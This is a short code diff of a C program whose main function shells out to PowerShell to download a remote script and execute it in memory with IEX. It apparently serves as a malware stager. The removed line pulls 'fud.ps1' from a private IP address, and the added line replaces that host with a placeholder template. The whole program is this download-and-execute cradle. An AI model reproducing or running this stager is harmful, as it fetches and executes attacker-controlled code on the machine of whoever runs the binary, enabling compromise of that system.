@@ -2,6 +2,6 @@
 
 int main()
 {
-    system("powershell.exe \"IEX ((new-object net.webclient).downloadstring('http://192.168.178.68/fud.ps1 '))\"");
+    system("powershell.exe \"IEX ((new-object net.webclient).downloadstring('http://X.X.X.X/name.output '))\"");
     return 0;
 }
